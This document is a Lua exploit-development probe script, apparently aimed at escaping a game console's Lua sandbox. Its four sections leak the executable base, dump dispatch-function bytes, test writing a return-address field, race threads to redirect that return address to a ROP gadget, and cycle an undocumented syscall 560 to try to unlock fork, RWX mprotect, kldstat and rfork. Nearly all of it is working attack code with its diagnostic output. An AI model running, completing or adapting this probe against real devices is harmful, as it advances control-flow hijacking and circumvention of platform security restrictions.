-- CRASH_CLASS: HIGH
-- PROBE 85b: Threaded dispatch return_addr race + sys 560 global unlock
--
-- Building on 85a's three untested attack angles:
--   1) __call CClosure +0x20 IS the syscall dispatch fn in eboot .text (RX)
--   2) fn_addr+0x10 (return address field) was NEVER tested for writability
--   3) sys 560 sets kernel global at RVA 0x3543a5c with NO checks
--
-- Threading angles:
--   C) Thread A writes fn_addr+0x10 while Thread B calls dispatch.
--      If write lands between entry and ret: controlled return address.
--   D) Thread A calls sys 560, Thread B immediately retests blocked syscalls.
--
-- Sections: A=read dispatch bytes, B=writability test, C=threaded race, D=global unlock

local TEST_SECTION = "A"

print("=== PROBE 85b: THREADED DISPATCH RETADDR RACE + GLOBAL UNLOCK ===")
print("Section: " .. TEST_SECTION)
print("")

collectgarbage("stop")

-- ================================================================
-- Helpers
-- ================================================================
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end; return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end; return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end; return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end); return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end); return ok
end
local function fmt_addr(val)
    if not val then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X_%08X", h, l)
end
local function hexbyte(b) return string.format("%02X", b) end
local function zero(buf, n)
    for off = 0, n - 4, 4 do safe_wd(buf + off, 0) end
end

-- Syscall constructors
local sc_mmap       = make_syscall(477)
local sc_munmap     = make_syscall(73)
local sc_nanosleep  = make_syscall(240)
local sc_thr_create = make_syscall(430)
local sc_thr_kill   = make_syscall(433)
local sc560         = make_syscall(560)
local sc_fork       = make_syscall(2)
local sc_mprot      = make_syscall(74)
local sc_kldstat    = make_syscall(308)
local sc_rfork      = make_syscall(251)
local sc_info       = make_syscall(593)

-- thr_create context offsets (confirmed 14.10)
local C_RDI=0x048; local C_RSI=0x050; local C_RDX=0x058; local C_RAX=0x078
local C_CS=0x0C0; local C_FLAGS=0x0D0; local C_RIP=0x0E0; local C_RSP=0x0F8
local C_SS=0x100; local C_MAGIC=0x108; local C_TYPE=0x110

local pid = to_num(syscall.getpid())
print("PID: " .. pid)

local function canary()
    local ok = pcall(function() syscall.getpid() end)
    return ok and "ALIVE" or "DEAD"
end

-- Pipe metadata
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fn_addr: (0x[0-9a-fA-F]+)")
    or pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local ret_str = pipe_str:match("return_addr: (0x[0-9a-fA-F]+)")
    or pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

print("fn_addr: " .. (fn_str or "nil"))
print("return_addr: " .. (ret_str or "nil"))
print("ropchain: " .. (rop_str or "nil"))

-- Eboot base via dynlib_get_info(593)
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_lo = safe_rd(info_buf + 0x108)
local eb_hi = safe_rd(info_buf + 0x10C)
local eboot_base = nil
if eb_lo and eb_hi then
    eboot_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
    print("eboot base: 0x" .. string.format("%X%08X", eb_hi, eb_lo))
end

-- Libkernel wrapper (syscall_address - 7)
local SW = syscall.syscall_address
local wrapper = nil
if SW then
    local sh, sl = get_hi_lo(SW)
    if sh < 0 then sh = sh + 0x100000000 end
    if sl < 0 then sl = sl + 0x100000000 end
    if sl < 7 then sl = sl + 0x100000000 - 7; sh = sh - 1
    else sl = sl - 7 end
    wrapper = uint64(string.format("0x%X%08X", sh, sl))
    print("wrapper: " .. fmt_addr(wrapper))
end
print("")

-- Thread helpers
local STACK_SIZE = 0x100000

local function alloc_retsled(target)
    local ok_s, stk = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_s then return nil end
    for off = 0, STACK_SIZE - 8, 8 do safe_wq(stk + off, target) end
    return stk
end

local function build_ctx(rip, rsp, rax, rdi, rsi, rdx)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    safe_wq(ctx + C_MAGIC, uint64(0x480))
    safe_wd(ctx + C_FLAGS, 0)
    safe_wq(ctx + C_TYPE, uint64(0x10000))
    safe_wq(ctx + C_CS, uint64(0x43))
    safe_wq(ctx + C_SS, uint64(0x3B))
    safe_wq(ctx + C_RIP, rip)
    safe_wq(ctx + C_RSP, rsp)
    safe_wq(ctx + C_RAX, rax or uint64(0))
    safe_wq(ctx + C_RDI, rdi or uint64(0))
    safe_wq(ctx + C_RSI, rsi or uint64(0))
    safe_wq(ctx + C_RDX, rdx or uint64(0))
    return ctx
end

local function spawn_thread(ctx)
    local tb = memory.alloc(8); safe_wq(tb, uint64(0))
    local ok, rv = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tb), uint64(0))
    end)
    if not ok or to_num(rv) ~= 0 then return nil end
    return safe_rq(tb)
end

local function msleep(ms)
    local ts = memory.alloc(16)
    safe_wq(ts, uint64(math.floor(ms / 1000)))
    safe_wq(ts + 8, uint64((ms % 1000) * 1000000))
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

local function kill_thread(tid)
    if tid then pcall(function() sc_thr_kill(tid, uint64(9)) end) end
end

-- ================================================================
-- SECTION A: Read dispatch function bytes from eboot .text
-- ================================================================
if TEST_SECTION == "A" then
    print("=== A: DISPATCH FUNCTION BYTES ===")
    print("")

    local mt = getmetatable(syscall.pipe)
    repeat
        if not mt or not mt.__call then
            print("ERROR: no __call metatable"); break
        end
        local cs = tostring(mt.__call)
        local ca = cs:match("function: (%d+)") or cs:match("function: (0x[0-9a-fA-F]+)")
            or cs:match("(%d+)$")
        if not ca then print("ERROR: cannot parse __call addr: " .. cs); break end

        local call_addr = uint64(ca)
        print("__call GCObject: " .. fmt_addr(call_addr))

        local cfunc = safe_rq(call_addr + 0x20)
        print("dispatch fn (+0x20): " .. fmt_addr(cfunc))
        if not cfunc then print("ERROR: read failed"); break end

        -- Eboot offset
        if eboot_base then
            local ch, cl = get_hi_lo(cfunc)
            local bh, bl = get_hi_lo(eboot_base)
            if ch == bh then
                print("eboot offset: +0x" .. string.format("%X", cl - bl))
            end
        end
        print("")

        -- x86-64 opcode hints
        local function hint(b0, b1, b2)
            if b0 == 0x55 then return "push rbp" end
            if b0 == 0x5D then return "pop rbp" end
            if b0 == 0xC3 then return "ret" end
            if b0 == 0xCC then return "int3" end
            if b0 == 0x0F and b1 == 0x05 then return "syscall" end
            if b0 == 0x48 and b1 == 0x89 and b2 == 0xE5 then return "mov rbp,rsp" end
            if b0 == 0x48 and b1 == 0x83 and b2 == 0xEC then return "sub rsp,imm8" end
            if b0 == 0xE8 then return "call rel32" end
            if b0 == 0xE9 then return "jmp rel32" end
            if b0 == 0xFF then return "call/jmp r/m" end
            return nil
        end

        -- Read 256 bytes
        print("--- DISPATCH BYTES (256) ---")
        for row = 0, 15 do
            local bo = row * 16
            local hex = {}; local bytes = {}
            for col = 0, 15 do
                local b = safe_rb(cfunc + bo + col)
                hex[col+1] = b and hexbyte(b) or "??"
                bytes[col+1] = b
            end
            local hints = {}
            for i = 1, 16 do
                local h = hint(bytes[i], bytes[i+1], bytes[i+2])
                if h then hints[#hints+1] = string.format("+%X:%s", bo+i-1, h) end
            end
            print(string.format("+%03X: %-48s %s", bo,
                table.concat(hex, " "), table.concat(hints, " ")))
        end
        print("--- END ---")
        print("")

        -- CClosure + fn_addr struct dumps
        print("--- CClosure struct ---")
        for off = 0, 0x40, 8 do
            local val = safe_rq(call_addr + off)
            local n = ""
            if off == 0x10 then n = " <- return_addr?" end
            if off == 0x20 then n = " <- dispatch fn" end
            print(string.format("  +0x%02X: %s%s", off, fmt_addr(val), n))
        end

        if fn_str then
            local fp = uint64(fn_str)
            print("")
            print("--- fn_addr struct ---")
            for off = 0, 0x30, 8 do
                local val = safe_rq(fp + off)
                local n = ""
                if off == 0x10 then n = " <- WRITE TARGET" end
                if off == 0x20 then n = " <- dispatch entry" end
                print(string.format("  +0x%02X: %s%s", off, fmt_addr(val), n))
            end
        end
    until true

    print(""); print("canary: " .. canary()); print("[A-DONE]")

-- ================================================================
-- SECTION B: Return address writability test
-- ================================================================
elseif TEST_SECTION == "B" then
    print("=== B: RETURN_ADDR WRITABILITY ===")
    print("")

    if not fn_str then
        print("ERROR: no fn_addr in pipe metadata")
        print("canary: " .. canary()); print("[B-DONE]")
        print("=== PROBE 85b COMPLETE ==="); return
    end

    local fn_ptr = uint64(fn_str)
    local ret_field = fn_ptr + uint64(0x10)
    local orig = safe_rq(ret_field)
    local dispatch = safe_rq(fn_ptr + uint64(0x20))
    print("fn_addr+0x10 value: " .. fmt_addr(orig))
    print("fn_addr+0x20 (dispatch): " .. fmt_addr(dispatch))

    -- Show what orig points to
    if orig and eboot_base then
        local oh, ol = get_hi_lo(orig)
        local bh, bl = get_hi_lo(eboot_base)
        if oh == bh then
            print("fn_addr+0x10 -> eboot+0x" .. string.format("%X", ol - bl))
            local hx = {}
            for i = 0, 15 do
                local b = safe_rb(orig + i)
                hx[#hx+1] = b and hexbyte(b) or "??"
            end
            print("Target bytes: " .. table.concat(hx, " "))
        end
    end
    print("")

    -- Writability test
    print("--- TEST 1: writability ---")
    local marker = uint64("0xDEADBEEFCAFEBABE")
    safe_wq(ret_field, marker)
    local rb = safe_rq(ret_field)
    safe_wq(ret_field, orig)  -- restore ASAP

    local writable = false
    if rb then
        local rh, _ = get_hi_lo(rb)
        if rh < 0 then rh = rh + 0x100000000 end
        writable = (rh == 0xDEADBEEF)
    end
    print("Marker readback: " .. fmt_addr(rb))
    print("WRITABLE: " .. tostring(writable))
    print("Restored: " .. fmt_addr(safe_rq(ret_field)))
    print("PID check: " .. to_num(syscall.getpid()) .. (to_num(syscall.getpid()) == pid and " OK" or " CHANGED"))
    print("")

    if writable then
        print("*** fn_addr+0x10 IS WRITABLE ***")
        print("")

        -- Behavioral test: write ret gadget, call getpid
        print("--- TEST 2: behavioral (ret gadget) ---")
        local ret_gadget = nil
        if rop_str then
            ret_gadget = safe_rq(uint64(rop_str))
            print("Ret gadget: " .. fmt_addr(ret_gadget))
        end
        if ret_gadget then
            safe_wq(ret_field, ret_gadget)
            local ok_gp, r_gp = pcall(function() return syscall.getpid() end)
            safe_wq(ret_field, orig)
            print("getpid: ok=" .. tostring(ok_gp) ..
                " val=" .. (ok_gp and tostring(to_num(r_gp)) or tostring(r_gp)))
            print("PID: " .. to_num(syscall.getpid()))
        end
        print("")

        -- Dispatch entry writability
        print("--- TEST 3: fn_addr+0x20 writability ---")
        local d_addr = fn_ptr + uint64(0x20)
        local orig_d = safe_rq(d_addr)
        safe_wq(d_addr, uint64("0xCCCCCCCCDDDDDDDD"))
        local d_rb = safe_rq(d_addr)
        safe_wq(d_addr, orig_d)
        local d_wr = false
        if d_rb then
            local dh, _ = get_hi_lo(d_rb)
            if dh < 0 then dh = dh + 0x100000000 end
            d_wr = (dh == 0xCCCCCCCC)
        end
        print("fn_addr+0x20 WRITABLE: " .. tostring(d_wr))
    else
        print("NOT writable — checking alternate return_addr ptr")
        if ret_str then
            local rp = uint64(ret_str)
            local ro = safe_rq(rp)
            safe_wq(rp, uint64("0x4343434344444444"))
            local arb = safe_rq(rp)
            safe_wq(rp, ro)
            local aw = false
            if arb then
                local ah, _ = get_hi_lo(arb)
                if ah < 0 then ah = ah + 0x100000000 end
                aw = (ah == 0x43434343)
            end
            print("Alternate ptr WRITABLE: " .. tostring(aw))
        end
    end

    print(""); print("canary: " .. canary()); print("[B-DONE]")

-- ================================================================
-- SECTION C: Threaded return_addr race
-- Child thread loops gettimeofday (heartbeat + scheduling perturb).
-- Main thread: write target to fn_addr+0x10, call syscall, restore.
-- If dispatch reads return_addr between write and restore, it returns
-- to our target.
-- ================================================================
elseif TEST_SECTION == "C" then
    print("=== C: THREADED RETURN_ADDR RACE ===")
    print("")

    if not wrapper then
        print("FATAL: no wrapper"); print("=== PROBE 85b COMPLETE ==="); return
    end
    if not fn_str then
        print("FATAL: no fn_addr"); print("=== PROBE 85b COMPLETE ==="); return
    end

    local fn_ptr = uint64(fn_str)
    local ret_field = fn_ptr + uint64(0x10)
    local orig = safe_rq(ret_field)
    print("fn_addr+0x10: " .. fmt_addr(orig))

    -- Pre-check writability
    safe_wq(ret_field, uint64("0x5555555566666666"))
    local pc = safe_rq(ret_field)
    safe_wq(ret_field, orig)
    local ph, _ = 0, 0
    if pc then ph, _ = get_hi_lo(pc); if ph < 0 then ph = ph + 0x100000000 end end
    if ph ~= 0x55555555 then
        print("fn_addr+0x10 NOT writable — race not feasible")
        print("canary: " .. canary()); print("[C-DONE]")
        print("=== PROBE 85b COMPLETE ==="); return
    end
    print("Confirmed writable")
    print("")

    -- Spawn child thread
    print("[C1] Spawning child thread...")
    local ok_tv, tv = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_tv then
        print("FATAL: tv mmap fail"); print("=== PROBE 85b COMPLETE ==="); return
    end
    zero(tv, 0x4000)

    local stk = alloc_retsled(wrapper)
    if not stk then
        print("FATAL: stack mmap fail"); print("=== PROBE 85b COMPLETE ==="); return
    end

    local ctx = build_ctx(wrapper, stk, uint64(116), tv, uint64(0), uint64(0))
    local child_tid = spawn_thread(ctx)
    if child_tid then
        msleep(20)
        local tsec = safe_rd(tv)
        print("Child TID: " .. fmt_addr(child_tid))
        if (tsec or 0) ~= 0 then print("*** CHILD RUNNING ***") end
    else
        print("Child thread failed, continuing single-threaded")
    end
    print("")

    -- Target address for return hijack (ret gadget = safe NOP)
    local target = nil
    if rop_str then target = safe_rq(uint64(rop_str)) end
    if not target then target = wrapper end
    print("[C2] Target addr: " .. fmt_addr(target))
    print("")

    -- Race: write target → syscall → restore (64 rounds)
    print("[C3] Race (64 rounds): write→call→restore...")
    local hits, crashes, normal = 0, 0, 0

    for round = 1, 64 do
        safe_wq(ret_field, target)
        local ok_gp, r_gp = pcall(function()
            local sc = make_syscall(20); return sc()
        end)
        safe_wq(ret_field, orig)

        if ok_gp then
            if to_num(r_gp) == pid then normal = normal + 1
            else
                hits = hits + 1
                print(string.format("  round %d: ANOMALY pid=%d", round, to_num(r_gp)))
            end
        else
            crashes = crashes + 1
            print(string.format("  round %d: ERROR: %s", round, tostring(r_gp)))
            if canary() == "DEAD" then print("  PROCESS DEAD"); break end
        end

        if round % 16 == 0 then
            print(string.format("  [%d] ok=%d hits=%d err=%d %s",
                round, normal, hits, crashes, canary()))
        end
    end

    print("")
    print("--- RACE RESULTS ---")
    print("Normal=" .. normal .. " Anomalies=" .. hits .. " Crashes=" .. crashes)
    if hits > 0 then print("*** RETURN HIJACK RACE WINS DETECTED ***") end
    if crashes > 0 then print("*** CRASHES: dispatch MAY read return_addr ***") end

    -- Aggressive: persistent write (only if safe race had 0 crashes)
    if crashes == 0 and canary() == "ALIVE" then
        print("")
        print("[C4] Aggressive: persistent write (8 rounds, 4 calls each)...")
        for round = 1, 8 do
            safe_wq(ret_field, target)
            local res = {}
            for c = 1, 4 do
                local ok_c, r_c = pcall(function()
                    local sc = make_syscall(20); return sc()
                end)
                res[c] = ok_c and to_num(r_c) or "FAIL"
            end
            safe_wq(ret_field, orig)
            print(string.format("  round %d: [%s,%s,%s,%s]",
                round, tostring(res[1]), tostring(res[2]),
                tostring(res[3]), tostring(res[4])))
            if canary() == "DEAD" then print("  DEAD"); break end
        end
    end

    kill_thread(child_tid)
    pcall(function() sc_munmap(tv, uint64(0x4000)) end)
    pcall(function() sc_munmap(stk, uint64(STACK_SIZE)) end)

    print(""); print("canary: " .. canary()); print("[C-DONE]")

-- ================================================================
-- SECTION D: Threaded sys 560 global unlock
-- Thread A (child) loops gettimeofday. Main sets sys 560 global,
-- then immediately tests fork/mprotect(RWX)/kldstat/rfork.
-- ================================================================
elseif TEST_SECTION == "D" then
    print("=== D: THREADED SYS 560 GLOBAL UNLOCK ===")
    print("")

    if not wrapper then
        print("FATAL: no wrapper"); print("=== PROBE 85b COMPLETE ==="); return
    end

    local function test_ops(label)
        print("  [" .. label .. "]")
        -- fork
        local ok_f, ret_f = pcall(function() return sc_fork() end)
        local rv_f = ok_f and to_num(ret_f) or -999
        print(string.format("    fork: ret=%d", rv_f))
        -- mprotect RWX
        local rv_mp = -999
        local ok_pg, pg = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
        if ok_pg then
            local ok_mp, ret_mp = pcall(function()
                return sc_mprot(pg, uint64(0x4000), uint64(7))
            end)
            rv_mp = ok_mp and to_num(ret_mp) or -999
            print(string.format("    mprotect(RWX): ret=%d", rv_mp))
            pcall(function() sc_munmap(pg, uint64(0x4000)) end)
        end
        -- kldstat
        local kb = memory.alloc(0x200); safe_wd(kb, 0x160)
        local ok_k, ret_k = pcall(function() return sc_kldstat(uint64(1), kb) end)
        local rv_k = ok_k and to_num(ret_k) or -999
        print(string.format("    kldstat: ret=%d", rv_k))
        -- rfork
        local ok_r, ret_r = pcall(function() return sc_rfork(uint64(0)) end)
        local rv_r = ok_r and to_num(ret_r) or -999
        print(string.format("    rfork: ret=%d", rv_r))
        return {fork=rv_f, mp=rv_mp, kld=rv_k, rf=rv_r}
    end

    -- Baseline
    print("[D1] Baseline...")
    local base = test_ops("BASELINE")
    print("")

    -- Spawn child
    print("[D2] Spawning child thread...")
    local ok_tv, tv = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_tv then
        print("FATAL: tv mmap fail"); print("=== PROBE 85b COMPLETE ==="); return
    end
    zero(tv, 0x4000)
    local stk = alloc_retsled(wrapper)
    if not stk then
        print("FATAL: stack fail"); print("=== PROBE 85b COMPLETE ==="); return
    end
    local ctx = build_ctx(wrapper, stk, uint64(116), tv, uint64(0), uint64(0))
    local child_tid = spawn_thread(ctx)
    if child_tid then
        msleep(20)
        local tsec = safe_rd(tv)
        print("Child TID: " .. fmt_addr(child_tid))
        if (tsec or 0) ~= 0 then print("*** CHILD RUNNING ***") end
    else
        print("Child failed, continuing single-threaded")
    end
    print("")

    -- Cycle sys 560 values
    print("[D3] sys 560 value cycle + immediate blocked op test...")
    local changes = {}
    local vals = {0, 1, 2, 0xFF, 0x100, 0x1000, 0xFFFF, 0x10000, 0x7FFFFFFF, 0xFFFFFFFF}

    for _, v in ipairs(vals) do
        local ok_s, ret_s = pcall(function() return sc560(uint64(v)) end)
        print(string.format("  560(0x%X): ret=%d", v, ok_s and to_num(ret_s) or -999))
        if ok_s then
            local r = test_ops(string.format("after 560(0x%X)", v))
            local changed = (r.fork ~= base.fork) or (r.mp ~= base.mp)
                or (r.kld ~= base.kld) or (r.rf ~= base.rf)
            if changed then
                changes[#changes+1] = {val=v, r=r}
                if r.fork ~= base.fork then print("    !!! FORK CHANGED !!!") end
                if r.mp ~= base.mp then print("    !!! MPROTECT CHANGED !!!") end
                if r.kld ~= base.kld then print("    !!! KLDSTAT CHANGED !!!") end
                if r.rf ~= base.rf then print("    !!! RFORK CHANGED !!!") end
            end
        end
        if canary() == "DEAD" then print("  DEAD"); break end
        print("")
    end

    -- Rapid race: set 560 + test one op per round
    print("[D4] Rapid race (gate values)...")
    local gate_vals = {1, 0xFF, 0xFFFF, 0x7FFFFFFF}
    local op_names = {"fork", "mprotect", "kldstat", "rfork"}

    for _, gv in ipairs(gate_vals) do
        for round = 1, 8 do
            pcall(function() return sc560(uint64(gv)) end)
            local which = ((round - 1) % 4) + 1
            local rv = -999
            if which == 1 then
                local ok, r = pcall(function() return sc_fork() end)
                rv = ok and to_num(r) or -999
            elseif which == 2 then
                local ok_pg, pg = pcall(function()
                    return sc_mmap(uint64(0),uint64(0x4000),uint64(3),
                        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
                end)
                if ok_pg then
                    local ok, r = pcall(function() return sc_mprot(pg,uint64(0x4000),uint64(7)) end)
                    rv = ok and to_num(r) or -999
                    pcall(function() sc_munmap(pg,uint64(0x4000)) end)
                end
            elseif which == 3 then
                local kb = memory.alloc(0x200); safe_wd(kb, 0x160)
                local ok, r = pcall(function() return sc_kldstat(uint64(1), kb) end)
                rv = ok and to_num(r) or -999
            else
                local ok, r = pcall(function() return sc_rfork(uint64(0)) end)
                rv = ok and to_num(r) or -999
            end
            -- Check for change
            local base_rv = -999
            if which == 1 then base_rv = base.fork
            elseif which == 2 then base_rv = base.mp
            elseif which == 3 then base_rv = base.kld
            else base_rv = base.rf end
            if rv ~= base_rv then
                print(string.format("  !!! 560(0x%X) round %d: %s CHANGED %d->%d !!!",
                    gv, round, op_names[which], base_rv, rv))
            end
            if canary() == "DEAD" then break end
        end
        if canary() == "DEAD" then break end
    end

    -- Reset and re-test
    print("")
    print("[D5] Reset global to 0...")
    pcall(function() return sc560(uint64(0)) end)
    test_ops("AFTER RESET")

    -- Summary
    print("")
    print("--- SUMMARY ---")
    if #changes == 0 then
        print("No behavior changes detected")
        print("Global at RVA 0x3543a5c may gate something other than fork/mprotect/kldstat/rfork")
    else
        for _, c in ipairs(changes) do
            print(string.format("  560(0x%X): fork=%d mp=%d kld=%d rf=%d",
                c.val, c.r.fork, c.r.mp, c.r.kld, c.r.rf))
        end
    end

    kill_thread(child_tid)
    pcall(function() sc_munmap(tv, uint64(0x4000)) end)
    pcall(function() sc_munmap(stk, uint64(STACK_SIZE)) end)

    print(""); print("canary: " .. canary()); print("[D-DONE]")

else
    print("ERROR: Unknown TEST_SECTION '" .. TEST_SECTION .. "' (valid: A, B, C, D)")
end

print("")
print("=== PROBE 85b COMPLETE ===")
